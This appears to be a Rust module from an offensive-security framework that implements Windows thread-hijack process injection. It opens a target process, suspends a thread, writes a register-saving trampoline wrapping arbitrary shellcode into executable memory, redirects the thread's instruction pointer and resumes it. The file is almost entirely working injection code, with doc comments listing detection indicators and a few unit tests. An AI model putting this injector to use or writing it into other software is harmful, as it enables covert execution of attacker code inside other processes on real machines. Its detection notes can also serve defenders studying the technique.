//! Tier 4: Thread hijack injection
//!
//! Hijacks an existing thread's execution context:
//! - Suspend the target thread
//! - Allocate and write shellcode with a trampoline stub
//! - Save original context (RIP/EIP, registers)
//! - Modify RIP/EIP to point to shellcode
//! - Resume execution
//!
//! This is the most invasive technique and risks crashing the target
//! process if the thread state isn't properly handled. The shellcode
//! must restore execution context after completion.
//!
//! Detection: Sysmon Event 25 (ProcessTampering), SetThreadContext calls,
//! SuspendThread + GetThreadContext + SetThreadContext + ResumeThread pattern

#[cfg(windows)]
use crate::{handle::OwnedHandle, InjectionResult};
#[cfg(windows)]
use common::KrakenError;

#[cfg(windows)]
use ntapi::ntmmapi::{NtAllocateVirtualMemory, NtProtectVirtualMemory, NtWriteVirtualMemory};
#[cfg(windows)]
use ntapi::winapi::ctypes::c_void as nt_void;
#[cfg(windows)]
use windows_sys::Win32::Foundation::NTSTATUS;
#[cfg(windows)]
use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE};
#[cfg(windows)]
use windows_sys::Win32::System::Threading::{
    OpenProcess, OpenThread, ResumeThread, SuspendThread,
    PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_WRITE,
    THREAD_GET_CONTEXT, THREAD_SET_CONTEXT, THREAD_SUSPEND_RESUME,
};
#[cfg(windows)]
use windows_sys::Win32::System::Diagnostics::Debug::{
    GetThreadContext, SetThreadContext, CONTEXT,
};

#[cfg(windows)]
use windows_sys::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Thread32First, Thread32Next, TH32CS_SNAPTHREAD, THREADENTRY32,
};

// Context flags for x64
#[cfg(windows)]
const CONTEXT_AMD64: u32 = 0x00100000;
#[cfg(windows)]
const CONTEXT_CONTROL: u32 = CONTEXT_AMD64 | 0x0001;
#[cfg(windows)]
const CONTEXT_INTEGER: u32 = CONTEXT_AMD64 | 0x0002;
#[cfg(windows)]
const CONTEXT_FULL: u32 = CONTEXT_CONTROL | CONTEXT_INTEGER;

/// Check if NTSTATUS indicates success
#[cfg(windows)]
#[inline]
fn nt_success(status: NTSTATUS) -> bool {
    status >= 0
}

/// Find the first thread ID belonging to a process (excluding main thread if possible)
#[cfg(windows)]
fn find_target_thread(target_pid: u32) -> Result<u32, KrakenError> {
    let snapshot = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0) };
    let snapshot = OwnedHandle::new(snapshot)
        .ok_or_else(|| KrakenError::Module("CreateToolhelp32Snapshot failed".into()))?;

    let mut threads = Vec::new();
    let mut entry = THREADENTRY32 {
        dwSize: std::mem::size_of::<THREADENTRY32>() as u32,
        cntUsage: 0,
        th32ThreadID: 0,
        th32OwnerProcessID: 0,
        tpBasePri: 0,
        tpDeltaPri: 0,
        dwFlags: 0,
    };

    if unsafe { Thread32First(snapshot.as_raw(), &mut entry) } != 0 {
        loop {
            if entry.th32OwnerProcessID == target_pid {
                threads.push(entry.th32ThreadID);
            }

            entry.dwSize = std::mem::size_of::<THREADENTRY32>() as u32;
            if unsafe { Thread32Next(snapshot.as_raw(), &mut entry) } == 0 {
                break;
            }
        }
    }

    // Prefer a secondary thread over the main thread for stability
    if threads.len() > 1 {
        Ok(threads[1])
    } else if !threads.is_empty() {
        Ok(threads[0])
    } else {
        Err(KrakenError::Module("no threads found in target process".into()))
    }
}

/// Build a trampoline stub that calls shellcode and returns to original RIP
///
/// This stub:
/// 1. Saves all volatile registers
/// 2. Calls the shellcode
/// 3. Restores registers
/// 4. Jumps back to original RIP
#[cfg(windows)]
fn build_trampoline(shellcode: &[u8], original_rip: u64) -> Vec<u8> {
    let mut stub = Vec::with_capacity(shellcode.len() + 64);

    // x64 trampoline:
    // push rax, rcx, rdx, r8, r9, r10, r11 (caller-saved)
    // sub rsp, 0x28 (shadow space + alignment)
    // <shellcode>
    // add rsp, 0x28
    // pop r11, r10, r9, r8, rdx, rcx, rax
    // mov rax, original_rip
    // jmp rax

    // Save registers
    stub.extend_from_slice(&[0x50]);                    // push rax
    stub.extend_from_slice(&[0x51]);                    // push rcx
    stub.extend_from_slice(&[0x52]);                    // push rdx
    stub.extend_from_slice(&[0x41, 0x50]);              // push r8
    stub.extend_from_slice(&[0x41, 0x51]);              // push r9
    stub.extend_from_slice(&[0x41, 0x52]);              // push r10
    stub.extend_from_slice(&[0x41, 0x53]);              // push r11
    stub.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]);  // sub rsp, 0x28

    // Inline shellcode
    stub.extend_from_slice(shellcode);

    // Restore stack and registers
    stub.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]);  // add rsp, 0x28
    stub.extend_from_slice(&[0x41, 0x5B]);              // pop r11
    stub.extend_from_slice(&[0x41, 0x5A]);              // pop r10
    stub.extend_from_slice(&[0x41, 0x59]);              // pop r9
    stub.extend_from_slice(&[0x41, 0x58]);              // pop r8
    stub.extend_from_slice(&[0x5A]);                    // pop rdx
    stub.extend_from_slice(&[0x59]);                    // pop rcx
    stub.extend_from_slice(&[0x58]);                    // pop rax

    // Jump back to original RIP
    stub.extend_from_slice(&[0x48, 0xB8]);              // mov rax, imm64
    stub.extend_from_slice(&original_rip.to_le_bytes());
    stub.extend_from_slice(&[0xFF, 0xE0]);              // jmp rax

    stub
}

/// Inject using thread context hijacking
///
/// # Arguments
/// * `target_pid` - Process ID of the target
/// * `shellcode` - The shellcode bytes to inject
/// * `wait` - Whether to wait for execution (approximate via sleep)
/// * `timeout_ms` - Timeout in milliseconds
///
/// # Returns
/// * `Ok(InjectionResult)` on success
/// * `Err(KrakenError)` on failure
///
/// # Detection Indicators
/// - SuspendThread + SetThreadContext + ResumeThread call sequence
/// - Sysmon Event 25 (ProcessTampering) - Thread context modified
/// - Thread RIP/EIP pointing to non-image memory
/// - Unusual thread state transitions (suspended -> running with changed context)
///
/// # Safety Warning
/// This technique is high-risk for process stability. The target thread
/// may crash if hijacked at an unsafe point (holding locks, in syscall, etc.)
#[cfg(windows)]
pub fn inject(
    target_pid: u32,
    shellcode: &[u8],
    wait: bool,
    timeout_ms: u32,
) -> Result<InjectionResult, KrakenError> {
    let proc_access = PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION;
    let thread_access = THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT;

    // Open target process
    let proc_handle = unsafe { OpenProcess(proc_access, 0, target_pid) };
    let proc_handle = OwnedHandle::new(proc_handle)
        .ok_or_else(|| KrakenError::Module("failed to open target process".into()))?;

    tracing::debug!(target_pid, "opened target process for thread hijack");

    // Find a suitable thread
    let thread_id = find_target_thread(target_pid)?;

    let thread_handle = unsafe { OpenThread(thread_access, 0, thread_id) };
    let thread_handle = OwnedHandle::new(thread_handle)
        .ok_or_else(|| KrakenError::Module("failed to open target thread".into()))?;

    tracing::debug!(target_pid, thread_id, "selected thread for hijacking");

    // Suspend the thread
    let suspend_count = unsafe { SuspendThread(thread_handle.as_raw()) };
    if suspend_count == u32::MAX {
        return Err(KrakenError::Module("SuspendThread failed".into()));
    }

    tracing::debug!(target_pid, thread_id, "suspended target thread");

    // Get thread context
    let mut context: CONTEXT = unsafe { std::mem::zeroed() };
    context.ContextFlags = CONTEXT_FULL;

    if unsafe { GetThreadContext(thread_handle.as_raw(), &mut context) } == 0 {
        unsafe { ResumeThread(thread_handle.as_raw()) };
        return Err(KrakenError::Module("GetThreadContext failed".into()));
    }

    let original_rip = context.Rip;
    tracing::debug!(
        target_pid,
        thread_id,
        original_rip = format!("0x{:016X}", original_rip),
        "captured thread context"
    );

    // Build trampoline with shellcode that returns to original RIP
    let trampoline = build_trampoline(shellcode, original_rip);

    // Allocate memory for trampoline
    let mut base_address: *mut nt_void = std::ptr::null_mut();
    let mut region_size: usize = trampoline.len();

    let status = unsafe {
        NtAllocateVirtualMemory(
            proc_handle.as_raw() as *mut _,
            &mut base_address as *mut *mut nt_void,
            0,
            &mut region_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };

    if !nt_success(status) {
        unsafe { ResumeThread(thread_handle.as_raw()) };
        return Err(KrakenError::Module(format!(
            "NtAllocateVirtualMemory failed: 0x{:08X}",
            status
        )));
    }

    // Write trampoline
    let mut bytes_written: usize = 0;
    let status = unsafe {
        NtWriteVirtualMemory(
            proc_handle.as_raw() as *mut _,
            base_address,
            trampoline.as_ptr() as *mut _,
            trampoline.len(),
            &mut bytes_written,
        )
    };

    if !nt_success(status) {
        unsafe { ResumeThread(thread_handle.as_raw()) };
        let mut free_size: usize = 0;
        unsafe {
            ntapi::ntmmapi::NtFreeVirtualMemory(
                proc_handle.as_raw() as *mut _,
                &mut base_address as *mut *mut nt_void,
                &mut free_size,
                windows_sys::Win32::System::Memory::MEM_RELEASE,
            );
        }
        return Err(KrakenError::Module(format!(
            "NtWriteVirtualMemory failed: 0x{:08X}",
            status
        )));
    }

    // Change protection to RX
    let mut protect_size: usize = trampoline.len();
    let mut old_protect: u32 = 0;
    let status = unsafe {
        NtProtectVirtualMemory(
            proc_handle.as_raw() as *mut _,
            &mut base_address as *mut *mut nt_void,
            &mut protect_size,
            PAGE_EXECUTE_READ,
            &mut old_protect,
        )
    };

    if !nt_success(status) {
        unsafe { ResumeThread(thread_handle.as_raw()) };
        let mut free_size: usize = 0;
        unsafe {
            ntapi::ntmmapi::NtFreeVirtualMemory(
                proc_handle.as_raw() as *mut _,
                &mut base_address as *mut *mut nt_void,
                &mut free_size,
                windows_sys::Win32::System::Memory::MEM_RELEASE,
            );
        }
        return Err(KrakenError::Module(format!(
            "NtProtectVirtualMemory failed: 0x{:08X}",
            status
        )));
    }

    tracing::debug!(
        target_pid,
        thread_id,
        addr = ?base_address,
        size = trampoline.len(),
        "wrote trampoline to target"
    );

    // Modify RIP to point to our trampoline
    context.Rip = base_address as u64;

    if unsafe { SetThreadContext(thread_handle.as_raw(), &context) } == 0 {
        unsafe { ResumeThread(thread_handle.as_raw()) };
        return Err(KrakenError::Module("SetThreadContext failed".into()));
    }

    tracing::debug!(
        target_pid,
        thread_id,
        new_rip = format!("0x{:016X}", context.Rip),
        "modified thread context"
    );

    // Resume thread execution
    if unsafe { ResumeThread(thread_handle.as_raw()) } == u32::MAX {
        return Err(KrakenError::Module("ResumeThread failed".into()));
    }

    tracing::info!(
        target_pid,
        thread_id,
        "thread hijack complete - execution redirected"
    );

    // Wait if requested (approximate - we can't truly wait for shellcode completion)
    if wait && timeout_ms > 0 {
        std::thread::sleep(std::time::Duration::from_millis(timeout_ms as u64));
    }

    Ok(InjectionResult {
        success: true,
        thread_id: Some(thread_id),
        technique_used: "Thread Hijack (SetThreadContext)".to_string(),
        error: None,
    })
}

#[cfg(not(windows))]
pub fn inject(
    _pid: u32,
    _shellcode: &[u8],
    _wait: bool,
    _timeout_ms: u32,
) -> Result<crate::InjectionResult, common::KrakenError> {
    Err(common::KrakenError::Module(
        "thread hijack injection only supported on Windows".into(),
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[cfg(not(windows))]
    #[test]
    fn test_inject_non_windows() {
        let result = inject(1234, &[0x90], false, 0);
        assert!(result.is_err());
        if let Err(common::KrakenError::Module(msg)) = result {
            assert!(msg.contains("only supported on Windows"));
        }
    }

    #[cfg(windows)]
    #[test]
    fn test_build_trampoline() {
        let shellcode = &[0x90, 0x90, 0x90]; // NOP sled
        let original_rip = 0x00007FF812340000u64;

        let trampoline = build_trampoline(shellcode, original_rip);

        // Should contain shellcode
        assert!(trampoline.windows(3).any(|w| w == shellcode));

        // Should end with jmp rax (FF E0)
        assert_eq!(&trampoline[trampoline.len()-2..], &[0xFF, 0xE0]);

        // Should contain original RIP bytes
        let rip_bytes = original_rip.to_le_bytes();
        assert!(trampoline.windows(8).any(|w| w == rip_bytes));
    }
}
